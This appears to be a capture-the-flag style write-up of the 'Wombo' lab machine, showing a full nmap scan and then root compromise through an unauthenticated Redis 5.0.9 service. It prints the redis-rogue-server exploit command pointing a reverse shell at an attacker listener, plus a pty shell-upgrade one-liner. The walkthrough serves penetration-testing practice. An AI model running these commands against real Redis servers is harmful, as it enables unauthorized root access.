---
title: Wombo PGP
description: Target - Wombo, OS - Linux, Difficulty - Intermediate
readTime: 10 min read
date: 10-12-2025
image: ../assets/images/wombo/exp.png
---

 ## ***Enumeration***
 
Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.

```
nmap -sVC -n -p- -T4 --open -Pn -oN Wombo-nmap 192.168.224.69

Nmap scan report for 192.168.224.69
Host is up (0.32s latency).
Not shown: 65529 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
80/tcp    open  http       nginx 1.10.3
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3
6379/tcp  open  redis      Redis key-value store 5.0.9
8080/tcp  open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=frWlTQAxmeejj3mV50P7e8La; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 11098
|     ETag: W/"2b5a-r0A1IywiuOi3BEQ7Rt8hUVMZZjs"
|     Vary: Accept-Encoding
|     Date: Sat, 27 Dec 2025 03:42:33 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Not Found | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_n
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=_4T8QU3uz18Vy3I5MAsdoSOX; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18181
|     ETag: W/"4705-BJ7KsrNtGxJDZSR9kyCz6U9ENms"
|     Vary: Accept-Encoding
|     Date: Sat, 27 Dec 2025 03:42:29 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Home | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_name" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Vary: Accept-Encoding
|     Date: Sat, 27 Dec 2025 03:42:30 GMT
|     Connection: close
|     GET,HEAD
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: Home | NodeBB
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
27017/tcp open  mongodb    MongoDB 4.0.18 4.1.1 - 5.0
| mongodb-databases: 
|   code = 13
|   codeName = Unauthorized
|   ok = 0.0
|_  errmsg = command listDatabases requires authentication
| mongodb-info: 
|   MongoDB Build info
|     javascriptEngine = mozjs
|     versionArray
|       0 = 4
|       1 = 0
|       2 = 18
|       3 = 0
|     ok = 1.0
|     modules
|     openssl
|       running = OpenSSL 1.1.0l  10 Sep 2019
|       compiled = OpenSSL 1.1.0l  10 Sep 2019
|     storageEngines
|       0 = devnull
|       1 = ephemeralForTest
|       2 = mmapv1
|       3 = wiredTiger
|     allocator = tcmalloc
|     sysInfo = deprecated
|     version = 4.0.18
|     buildEnvironment
|       distarch = x86_64
|       target_arch = x86_64
|       target_os = linux
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|       distmod = debian92
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67
|     maxBsonObjectSize = 16777216
|     debug = false
|     bits = 64
|   Server status
|     code = 13
|     codeName = Unauthorized
|     ok = 0.0
|_    errmsg = command serverStatus requires authentication

```

There were many open port s and services runnings on the target system.
1. Nginx 
2. Redis
3. http-proxy
4. MongoDB

Accessed the port 80 to see if any site is up and running. It was the default nginx page.
Nothing much to proceed here.

![nginx-page](/1dragon/assets/images/wombo/web-page-nginx.png)

Further more among all the open ports and services the port 6379 runs a  redis service. Redis key-value store 5.0.9

Searched for exisitng exploit about this version of redis and discovered one  https://github.com/n0b0dyCN/redis-rogue-server

---

 ## ***Initial Access and System Comprmise***

After mirroring the exploit ran it with the following parameter.

```
python3 redis-rogue-server.py --rhost 192.168.224.69 --rport 6379 --lhost 192.168.45.191 --lport 6379 --v
```


![exp](/1dragon/assets/images/wombo/exp.png)

After the exploit was triggered it gives two option to connect with the target 
1. Interactive Shell
2. Reverse Shell

Proceeded with a reverse shell. Set the server address and port.

![rev-opt](/1dragon/assets/images/wombo/exp-opt.png)

Had a listener running at port 6379

Got the shell captured as root user the service by default was running as root.

Upgraded the shell with `python3 -c 'import pty;pty.spawn("/bin/bash")'`

![rev-shell](/1dragon/assets/images/wombo/revshell-root.png)

Captured the proof.txt under /root successfully.

---

										Target compromised - |^| ^( |< 3 D